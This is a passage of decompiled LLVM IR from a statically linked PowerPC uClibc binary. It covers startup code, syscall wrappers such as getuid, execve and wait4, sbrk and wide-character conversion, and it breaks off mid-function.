  store i32 %v2_1000c260, i32* @r3, align 4
  store i32 %v0_1000c264, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268485232, i32* @lr, align 4
  %v0_1000c26c = call i32 @memcpy()
  %v0_1000c270.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c270

dec_label_pc_1000c270:                            ; preds = %dec_label_pc_1000c250, %dec_label_pc_1000c258
  %v0_1000c270 = phi i32 [ %v0_1000c264, %dec_label_pc_1000c250 ], [ %v0_1000c270.pre, %dec_label_pc_1000c258 ]
  %v1_1000c270 = add i32 %v0_1000c270, 8
  store i32 %v1_1000c270, i32* %r29.global-to-local, align 4
  %v1_1000c274 = inttoptr i32 %v1_1000c270 to i32*
  %v2_1000c274 = load i32, i32* %v1_1000c274, align 4
  %v3_1000c278 = icmp eq i32 %v2_1000c274, 0
  br i1 %v3_1000c278, label %dec_label_pc_1000c280, label %dec_label_pc_1000c250

dec_label_pc_1000c280:                            ; preds = %dec_label_pc_1000c270, %dec_label_pc_1000c248
  %v1_1000c284 = call i32 @_dl_aux_init(i32 %v2_1000c21c)
  store i32 %v1_1000c284, i32* @r3, align 4
  store i32 268485260, i32* @lr, align 4
  %v1_1000c288 = call i32 @__GI___uClibc_init(i32 %v1_1000c284)
  %v3_1000c290 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000c290, label %dec_label_pc_1000c298, label %dec_label_pc_1000c29c

dec_label_pc_1000c298:                            ; preds = %dec_label_pc_1000c280
  br label %dec_label_pc_1000c29c

dec_label_pc_1000c29c:                            ; preds = %dec_label_pc_1000c280, %dec_label_pc_1000c298
  %v0_1000c2a4 = phi i32 [ %tmp27, %dec_label_pc_1000c280 ], [ 4096, %dec_label_pc_1000c298 ]
  store i32 %v0_1000c2a4, i32* @global_var_10024a70.553, align 4
  %v3_1000c2a8 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000c2a8, label %dec_label_pc_1000c2b0, label %dec_label_pc_1000c2e4

dec_label_pc_1000c2b0:                            ; preds = %dec_label_pc_1000c29c
  store i32 268485300, i32* @lr, align 4
  %v1_1000c2b0 = call i32 @getuid(i32 268566528)
  store i32 %v1_1000c2b0, i32* %r29.global-to-local, align 4
  store i32 268485308, i32* @lr, align 4
  %v0_1000c2b8 = call i32 @geteuid()
  %v4_1000c2bc = icmp eq i32 %v1_1000c2b0, %v0_1000c2b8
  br i1 %v4_1000c2bc, label %dec_label_pc_1000c2c4, label %dec_label_pc_1000c300

dec_label_pc_1000c2c4:                            ; preds = %dec_label_pc_1000c2b0
  store i32 268485320, i32* @lr, align 4
  %v1_1000c2c4 = call i32 @getgid(i32 %v0_1000c2b8)
  store i32 %v1_1000c2c4, i32* %r29.global-to-local, align 4
  store i32 268485328, i32* @lr, align 4
  %v0_1000c2cc = call i32 @getegid()
  %v4_1000c2d0 = icmp eq i32 %v1_1000c2c4, %v0_1000c2cc
  br i1 %v4_1000c2d0, label %dec_label_pc_1000c2d8.thread, label %dec_label_pc_1000c300

dec_label_pc_1000c2d8.thread:                     ; preds = %dec_label_pc_1000c2c4
  br label %dec_label_pc_1000c330

dec_label_pc_1000c2e4:                            ; preds = %dec_label_pc_1000c29c
  %v4_1000c2e8 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000c2e8, label %dec_label_pc_1000c2f0, label %dec_label_pc_1000c300

dec_label_pc_1000c2f0:                            ; preds = %dec_label_pc_1000c2e4
  br label %dec_label_pc_1000c300

dec_label_pc_1000c300:                            ; preds = %dec_label_pc_1000c2f0, %dec_label_pc_1000c2e4, %dec_label_pc_1000c2c4, %dec_label_pc_1000c2b0
  store i32 268485392, i32* @lr, align 4
  %v2_1000c30c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268485408, i32* @lr, align 4
  %v2_1000c31c = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268485424, i32* @lr, align 4
  %v2_1000c32c = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000c330

dec_label_pc_1000c330:                            ; preds = %dec_label_pc_1000c2d8.thread, %dec_label_pc_1000c300
  %v0_1000c33c = load i32, i32* @r30, align 4
  %v1_1000c33c = inttoptr i32 %v0_1000c33c to i32*
  %v2_1000c33c = load i32, i32* %v1_1000c33c, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000c33c, i32* inttoptr (i32 268585492 to i32*), align 4
  %v0_1000c35c = load i32, i32* @r27, align 4
  store i32 %v0_1000c35c, i32* @global_var_10024a74.634, align 4
  br i1 false, label %dec_label_pc_1000c364, label %dec_label_pc_1000c3dc

dec_label_pc_1000c364:                            ; preds = %dec_label_pc_1000c330, %dec_label_pc_1000c364
  br i1 undef, label %dec_label_pc_1000c364, label %dec_label_pc_1000c3dc

dec_label_pc_1000c3dc:                            ; preds = %dec_label_pc_1000c364, %dec_label_pc_1000c330
  %v0_1000c388 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000c388)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000c3ec = call i32 @__errno_location()
  %v2_1000c3f4 = inttoptr i32 %v0_1000c3ec to i32*
  store i32 0, i32* %v2_1000c3f4, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -14572), i32 0), label %dec_label_pc_1000c414, label %dec_label_pc_1000c408

dec_label_pc_1000c408:                            ; preds = %dec_label_pc_1000c3dc
  %v0_1000c408 = call i32 @__GI___h_errno_location()
  %v2_1000c410 = inttoptr i32 %v0_1000c408 to i32*
  store i32 0, i32* %v2_1000c410, align 4
  br label %dec_label_pc_1000c414

dec_label_pc_1000c414:                            ; preds = %dec_label_pc_1000c3dc, %dec_label_pc_1000c408
  %v0_1000c420 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000c420)
  %v0_1000c42c = call i32 @__GI_exit()
  ret i32 %v0_1000c42c

; uselistorder directives
  uselistorder i32 %v2_1000c274, { 1, 0 }
  uselistorder i32 %v1_1000c270, { 2, 1, 0 }
  uselistorder i32 %v1_1000c23c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000c21c, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_exit, { 0, 6, 5, 3, 4, 1, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 10, 11, 2, 9, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c414, { 1, 0 }
  uselistorder label %dec_label_pc_1000c364, { 1, 0 }
  uselistorder label %dec_label_pc_1000c330, { 1, 0 }
  uselistorder label %dec_label_pc_1000c29c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c270, { 1, 0 }
  uselistorder label %dec_label_pc_1000c250, { 1, 0 }
  uselistorder label %dec_label_pc_1000c21c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000c43c = load i32, i32* @r3, align 4
  store i32 %v0_1000c43c, i32* @r29, align 4
  %v0_1000c444 = call i32 @__errno_location()
  %v0_1000c448 = load i32, i32* @r29, align 4
  %v2_1000c448 = inttoptr i32 %v0_1000c444 to i32*
  store i32 %v0_1000c448, i32* %v2_1000c448, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c47c = call i32 @__asm_mfcr()
  %v1_1000c480 = and i32 %v0_1000c47c, 268435456
  %v3_1000c480 = icmp eq i32 %v1_1000c480, 0
  store i32 %v0_1000c47c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c480, label %dec_label_pc_1000c498, label %dec_label_pc_1000c48c

dec_label_pc_1000c48c:                            ; preds = %entry
  %v0_1000c48c = call i32 @__errno_location()
  %v0_1000c490 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c490 = inttoptr i32 %v0_1000c48c to i32*
  store i32 %v0_1000c490, i32* %v2_1000c490, align 4
  br label %dec_label_pc_1000c498

dec_label_pc_1000c498:                            ; preds = %entry, %dec_label_pc_1000c48c
  %v0_1000c4a8 = phi i32 [ %v0_1000c47c, %entry ], [ -1, %dec_label_pc_1000c48c ]
  ret i32 %v0_1000c4a8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c498, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4c4 = call i32 @__asm_mfcr()
  %v1_1000c4c8 = and i32 %v0_1000c4c4, 268435456
  %v3_1000c4c8 = icmp eq i32 %v1_1000c4c8, 0
  store i32 %v0_1000c4c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4c8, label %dec_label_pc_1000c4e0, label %dec_label_pc_1000c4d4

dec_label_pc_1000c4d4:                            ; preds = %entry
  %v0_1000c4d4 = call i32 @__errno_location()
  %v0_1000c4d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c4d8 = inttoptr i32 %v0_1000c4d4 to i32*
  store i32 %v0_1000c4d8, i32* %v2_1000c4d8, align 4
  br label %dec_label_pc_1000c4e0

dec_label_pc_1000c4e0:                            ; preds = %entry, %dec_label_pc_1000c4d4
  %v0_1000c4f0 = phi i32 [ %v0_1000c4c4, %entry ], [ -1, %dec_label_pc_1000c4d4 ]
  ret i32 %v0_1000c4f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4e0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c50c = call i32 @__asm_mfcr()
  %v1_1000c510 = and i32 %v0_1000c50c, 268435456
  %v3_1000c510 = icmp eq i32 %v1_1000c510, 0
  store i32 %v0_1000c50c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c510, label %dec_label_pc_1000c528, label %dec_label_pc_1000c51c

dec_label_pc_1000c51c:                            ; preds = %entry
  %v0_1000c51c = call i32 @__errno_location()
  %v0_1000c520 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c520 = inttoptr i32 %v0_1000c51c to i32*
  store i32 %v0_1000c520, i32* %v2_1000c520, align 4
  br label %dec_label_pc_1000c528

dec_label_pc_1000c528:                            ; preds = %entry, %dec_label_pc_1000c51c
  %v0_1000c538 = phi i32 [ %v0_1000c50c, %entry ], [ -1, %dec_label_pc_1000c51c ]
  ret i32 %v0_1000c538

; uselistorder directives
  uselistorder label %dec_label_pc_1000c528, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c554 = call i32 @__asm_mfcr()
  %v1_1000c558 = and i32 %v0_1000c554, 268435456
  %v3_1000c558 = icmp eq i32 %v1_1000c558, 0
  store i32 %v0_1000c554, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c558, label %dec_label_pc_1000c570, label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %entry
  %v0_1000c564 = call i32 @__errno_location()
  %v0_1000c568 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c568 = inttoptr i32 %v0_1000c564 to i32*
  store i32 %v0_1000c568, i32* %v2_1000c568, align 4
  br label %dec_label_pc_1000c570

dec_label_pc_1000c570:                            ; preds = %entry, %dec_label_pc_1000c564
  %v0_1000c580 = phi i32 [ %v0_1000c554, %entry ], [ -1, %dec_label_pc_1000c564 ]
  ret i32 %v0_1000c580

; uselistorder directives
  uselistorder label %dec_label_pc_1000c570, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c59c = call i32 @__asm_mfcr()
  %v1_1000c5a0 = and i32 %v0_1000c59c, 268435456
  %v3_1000c5a0 = icmp eq i32 %v1_1000c5a0, 0
  store i32 %v0_1000c59c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5a0, label %dec_label_pc_1000c5b8, label %dec_label_pc_1000c5ac

dec_label_pc_1000c5ac:                            ; preds = %entry
  %v0_1000c5ac = call i32 @__errno_location()
  %v0_1000c5b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5b0 = inttoptr i32 %v0_1000c5ac to i32*
  store i32 %v0_1000c5b0, i32* %v2_1000c5b0, align 4
  br label %dec_label_pc_1000c5b8

dec_label_pc_1000c5b8:                            ; preds = %entry, %dec_label_pc_1000c5ac
  %v0_1000c5c8 = phi i32 [ %v0_1000c59c, %entry ], [ -1, %dec_label_pc_1000c5ac ]
  ret i32 %v0_1000c5c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5b8, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5e4 = call i32 @__asm_mfcr()
  %v1_1000c5e8 = and i32 %v0_1000c5e4, 268435456
  %v3_1000c5e8 = icmp eq i32 %v1_1000c5e8, 0
  store i32 %v0_1000c5e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5e8, label %dec_label_pc_1000c600, label %dec_label_pc_1000c5f4

dec_label_pc_1000c5f4:                            ; preds = %entry
  %v0_1000c5f4 = call i32 @__errno_location()
  %v0_1000c5f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5f8 = inttoptr i32 %v0_1000c5f4 to i32*
  store i32 %v0_1000c5f8, i32* %v2_1000c5f8, align 4
  br label %dec_label_pc_1000c600

dec_label_pc_1000c600:                            ; preds = %entry, %dec_label_pc_1000c5f4
  %v0_1000c610 = phi i32 [ %v0_1000c5e4, %entry ], [ -1, %dec_label_pc_1000c5f4 ]
  ret i32 %v0_1000c610

; uselistorder directives
  uselistorder label %dec_label_pc_1000c600, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c62c = call i32 @__asm_mfcr()
  %v1_1000c630 = and i32 %v0_1000c62c, 268435456
  %v3_1000c630 = icmp eq i32 %v1_1000c630, 0
  store i32 %v0_1000c62c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c630, label %dec_label_pc_1000c648, label %dec_label_pc_1000c63c

dec_label_pc_1000c63c:                            ; preds = %entry
  %v0_1000c63c = call i32 @__errno_location()
  %v0_1000c640 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c640 = inttoptr i32 %v0_1000c63c to i32*
  store i32 %v0_1000c640, i32* %v2_1000c640, align 4
  br label %dec_label_pc_1000c648

dec_label_pc_1000c648:                            ; preds = %entry, %dec_label_pc_1000c63c
  %v0_1000c658 = phi i32 [ %v0_1000c62c, %entry ], [ -1, %dec_label_pc_1000c63c ]
  ret i32 %v0_1000c658

; uselistorder directives
  uselistorder label %dec_label_pc_1000c648, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c678 = load i32, i32* @global_var_10024aa0.641, align 4
  %v3_1000c67c = icmp eq i32 %v3_1000c678, 0
  br i1 %v3_1000c67c, label %dec_label_pc_1000c684, label %dec_label_pc_1000c690

dec_label_pc_1000c684:                            ; preds = %entry
  store i32 268486280, i32* @lr, align 4
  %v1_1000c684 = call i32 @__GI_brk(i32 0)
  %v1_1000c688 = icmp slt i32 %v1_1000c684, 0
  br i1 %v1_1000c688, label %dec_label_pc_1000c6b0, label %dec_label_pc_1000c684.dec_label_pc_1000c690_crit_edge

dec_label_pc_1000c684.dec_label_pc_1000c690_crit_edge: ; preds = %dec_label_pc_1000c684
  %v0_1000c690.pre = load i32, i32* @r30, align 4
  %v3_1000c694.pre = load i32, i32* @global_var_10024aa0.641, align 4
  br label %dec_label_pc_1000c690

dec_label_pc_1000c690:                            ; preds = %dec_label_pc_1000c684.dec_label_pc_1000c690_crit_edge, %entry
  %v3_1000c694 = phi i32 [ %v3_1000c694.pre, %dec_label_pc_1000c684.dec_label_pc_1000c690_crit_edge ], [ %v3_1000c678, %entry ]
  %v1_1000c69c = phi i32 [ %v0_1000c690.pre, %dec_label_pc_1000c684.dec_label_pc_1000c690_crit_edge ], [ %arg1, %entry ]
  %v3_1000c690 = icmp eq i32 %v1_1000c69c, 0
  store i32 %v3_1000c694, i32* @r31, align 4
  br i1 %v3_1000c690, label %dec_label_pc_1000c6b4, label %dec_label_pc_1000c6a4

dec_label_pc_1000c6a4:                            ; preds = %dec_label_pc_1000c690
  %v2_1000c69c = add i32 %v1_1000c69c, %v3_1000c694
  store i32 268486312, i32* @lr, align 4
  %v1_1000c6a4 = call i32 @__GI_brk(i32 %v2_1000c69c)
  %tmp6 = icmp sgt i32 %v1_1000c6a4, -1
  br i1 %tmp6, label %dec_label_pc_1000c6a4.dec_label_pc_1000c6b4_crit_edge, label %dec_label_pc_1000c6b0

dec_label_pc_1000c6a4.dec_label_pc_1000c6b4_crit_edge: ; preds = %dec_label_pc_1000c6a4
  %v0_1000c6b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c6b4

dec_label_pc_1000c6b0:                            ; preds = %dec_label_pc_1000c6a4, %dec_label_pc_1000c684
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000c6b4

dec_label_pc_1000c6b4:                            ; preds = %dec_label_pc_1000c6a4.dec_label_pc_1000c6b4_crit_edge, %dec_label_pc_1000c690, %dec_label_pc_1000c6b0
  %v0_1000c6b8 = phi i32 [ %v0_1000c6b8.pre, %dec_label_pc_1000c6a4.dec_label_pc_1000c6b4_crit_edge ], [ %v3_1000c694, %dec_label_pc_1000c690 ], [ -1, %dec_label_pc_1000c6b0 ]
  ret i32 %v0_1000c6b8

; uselistorder directives
  uselistorder i32 %v3_1000c694, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6b4, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c6e4 = call i32 @__asm_mfcr()
  %v1_1000c6e8 = and i32 %v0_1000c6e4, 268435456
  %v3_1000c6e8 = icmp eq i32 %v1_1000c6e8, 0
  store i32 %v0_1000c6e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6e8, label %dec_label_pc_1000c700, label %dec_label_pc_1000c6f4

dec_label_pc_1000c6f4:                            ; preds = %entry
  %v0_1000c6f4 = call i32 @__errno_location()
  %v0_1000c6f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6f8 = inttoptr i32 %v0_1000c6f4 to i32*
  store i32 %v0_1000c6f8, i32* %v2_1000c6f8, align 4
  br label %dec_label_pc_1000c700

dec_label_pc_1000c700:                            ; preds = %entry, %dec_label_pc_1000c6f4
  %v0_1000c710 = phi i32 [ %v0_1000c6e4, %entry ], [ -1, %dec_label_pc_1000c6f4 ]
  ret i32 %v0_1000c710

; uselistorder directives
  uselistorder label %dec_label_pc_1000c700, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10024a84.642 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000c720 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000c73c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000c73c, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000c720, label %dec_label_pc_1000c748, label %dec_label_pc_1000c750

dec_label_pc_1000c748:                            ; preds = %entry
  %v2_1000c748 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c748, i32* @r3, align 4
  br label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %entry, %dec_label_pc_1000c748
  %v0_1000c754 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000c748 ]
  %v2_1000c750 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000c754, i32* %stack_var_-40, align 4
  store i32 %v2_1000c750, i32* %stack_var_-36, align 4
  store i32 268486496, i32* @lr, align 4
  %v0_1000c75c = call i32 @__GI_wcsnrtombs()
  %v3_1000c760 = icmp eq i32 %v0_1000c75c, 0
  br i1 %v3_1000c760, label %dec_label_pc_1000c768, label %dec_label_pc_1000c76c

dec_label_pc_1000c768:                            ; preds = %dec_label_pc_1000c750
  br label %dec_label_pc_1000c76c

dec_label_pc_1000c76c:                            ; preds = %dec_label_pc_1000c750, %dec_label_pc_1000c768
  %v0_1000c778 = phi i32 [ %v0_1000c75c, %dec_label_pc_1000c750 ], [ 1, %dec_label_pc_1000c768 ]
  ret i32 %v0_1000c778

; uselistorder directives
  uselistorder label %dec_label_pc_1000c76c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c750, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000c77c = load i32, i32* @r6, align 4
  store i32 %v0_1000c77c, i32* @r7, align 4
  %v0_1000c780 = load i32, i32* @r5, align 4
  store i32 %v0_1000c780, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000c788 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000c788

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c78c = load i32, i32* @r3, align 4
  %v3_1000c78c = icmp eq i32 %v0_1000c78c, 0
  %v0_1000c790 = load i32, i32* @lr, align 4
  store i32 %v0_1000c790, i32* %r0.global-to-local, align 4
  br i1 %v3_1000c78c, label %dec_label_pc_1000c7b8, label %dec_label_pc_1000c7a0

dec_label_pc_1000c7a0:                            ; preds = %entry
  %v1_1000c7a0 = load i32, i32* @r4, align 4
  %v4_1000c7a0 = icmp eq i32 %v0_1000c78c, %v1_1000c7a0
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000c7a0, label %dec_label_pc_1000c7ac, label %dec_label_pc_1000c7e4

dec_label_pc_1000c7ac:                            ; preds = %dec_label_pc_1000c7a0
  %v2_1000c7b0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c7b0, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c7b8:                            ; preds = %entry
  %v2_1000c7b011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c7b011, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c7c4:                            ; preds = %dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge, %dec_label_pc_1000c804.preheader
  %v0_1000c7c4 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000c7d0 = inttoptr i32 %v0_1000c7c4 to i32*
  store i32 84, i32* %v2_1000c7d0, align 4
  %v0_1000c848.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c844

dec_label_pc_1000c7d8:                            ; preds = %dec_label_pc_1000c814
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c834.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c830

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c7ac, %dec_label_pc_1000c7a0, %dec_label_pc_1000c7b8
  %v2_1000c8147 = phi i32 [ %v2_1000c7b0, %dec_label_pc_1000c7ac ], [ %v0_1000c78c, %dec_label_pc_1000c7a0 ], [ %v2_1000c7b011, %dec_label_pc_1000c7b8 ]
  %v0_1000c7e4 = load i32, i32* @r5, align 4
  %v1_1000c7e4 = load i32, i32* @r6, align 4
  %v3_1000c7e4 = icmp ugt i32 %v0_1000c7e4, %v1_1000c7e4
  br i1 %v3_1000c7e4, label %dec_label_pc_1000c7ec, label %dec_label_pc_1000c7f0

dec_label_pc_1000c7ec:                            ; preds = %dec_label_pc_1000c7e4
  store i32 %v1_1000c7e4, i32* @r5, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c7e4, %dec_label_pc_1000c7ec
  %v0_1000c7fc = phi i32 [ %v0_1000c7e4, %dec_label_pc_1000c7e4 ], [ %v1_1000c7e4, %dec_label_pc_1000c7ec ]
  %v1_1000c7f0 = add i32 %v0_1000c7fc, 1
  store i32 %v1_1000c7f0, i32* %r0.global-to-local, align 4
  %v0_1000c7f4 = load i32, i32* @r4, align 4
  %v1_1000c7f4 = inttoptr i32 %v0_1000c7f4 to i32*
  %v2_1000c7f4 = load i32, i32* %v1_1000c7f4, align 4
  store i32 %v2_1000c7f4, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c7fc, i32* %r9.global-to-local, align 4
  store i32 %v0_1000c7fc, i32* %ctr.global-to-local, align 4
  %v2_1000c82c3 = icmp eq i32 %v0_1000c7fc, 0
  br i1 %v2_1000c82c3, label %dec_label_pc_1000c830, label %dec_label_pc_1000c804.preheader

dec_label_pc_1000c804.preheader:                  ; preds = %dec_label_pc_1000c7f0
  %v1_1000c80416 = inttoptr i32 %v2_1000c7f4 to i32*
  %v2_1000c80417 = load i32, i32* %v1_1000c80416, align 4
  store i32 %v2_1000c80417, i32* %r0.global-to-local, align 4
  %v1_1000c80818 = add i32 %v2_1000c7f4, 4
  store i32 %v1_1000c80818, i32* %r11.global-to-local, align 4
  %v2_1000c80c20 = icmp ugt i32 %v2_1000c80417, 127
  br i1 %v2_1000c80c20, label %dec_label_pc_1000c7c4, label %dec_label_pc_1000c814.lr.ph

dec_label_pc_1000c814.lr.ph:                      ; preds = %dec_label_pc_1000c804.preheader
  %extract.t = trunc i32 %v2_1000c80417 to i8
  br label %dec_label_pc_1000c814

dec_label_pc_1000c814:                            ; preds = %dec_label_pc_1000c814.lr.ph, %dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge
  %v2_1000c80423.off0 = phi i8 [ %extract.t, %dec_label_pc_1000c814.lr.ph ], [ %extract.t24, %dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge ]
  %v2_1000c81422 = phi i32 [ %v2_1000c8147, %dec_label_pc_1000c814.lr.ph ], [ %v2_1000c824, %dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge ]
  %v3_1000c814 = inttoptr i32 %v2_1000c81422 to i8*
  store i8 %v2_1000c80423.off0, i8* %v3_1000c814, align 1
  %v0_1000c818 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c818 = urem i32 %v0_1000c818, 256
  store i32 %v1_1000c818, i32* %r0.global-to-local, align 4
  %v3_1000c81c = icmp eq i32 %v1_1000c818, 0
  br i1 %v3_1000c81c, label %dec_label_pc_1000c7d8, label %dec_label_pc_1000c824

dec_label_pc_1000c824:                            ; preds = %dec_label_pc_1000c814
  %v0_1000c824 = load i32, i32* @r3, align 4
  %v1_1000c824 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c824 = add i32 %v1_1000c824, %v0_1000c824
  store i32 %v2_1000c824, i32* @r3, align 4
  %v0_1000c828 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c828 = add i32 %v0_1000c828, -1
  store i32 %v1_1000c828, i32* %r9.global-to-local, align 4
  %v0_1000c82c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c82c = add i32 %v0_1000c82c, -1
  store i32 %v1_1000c82c, i32* %ctr.global-to-local, align 4
  %v2_1000c82c = icmp eq i32 %v1_1000c82c, 0
  br i1 %v2_1000c82c, label %dec_label_pc_1000c830, label %dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge

dec_label_pc_1000c824.dec_label_pc_1000c804_crit_edge: ; preds = %dec_label_pc_1000c824
  %v0_1000c804.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c804 = inttoptr i32 %v0_1000c804.pre to i32*
  %v2_1000c804 = load i32, i32* %v1_1000c804, align 4
  store i32 %v2_1000c804, i32* %r0.global-to-local, align 4
  %v1_1000c808 = add i32 %v0_1000c804.pre, 4
  store i32 %v1_1000c808, i32* %r11.global-to-local, align 4
  %v2_1000c80c = icmp ugt i32 %v2_1000c804, 127
  %extract.t24 = trunc i32 %v2_1000c804 to i8
  br i1 %v2_1000c80c, label %dec_label_pc_1000c7c4, label %dec_label_pc_1000c814

dec_label_pc_1000c830:                            ; preds = %dec_label_pc_1000c824, %dec_label_pc_1000c7f0, %dec_label_pc_1000c7d8
  %v0_1000c834 = phi i32 [ %v0_1000c834.pre, %dec_label_pc_1000c7d8 ], [ %v2_1000c8147, %dec_label_pc_1000c7f0 ], [ %v2_1000c824, %dec_label_pc_1000c824 ]
  %v2_1000c830 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c830, i32* %r0.global-to-local, align 4
  %v4_1000c834 = icmp eq i32 %v0_1000c834, %v2_1000c830
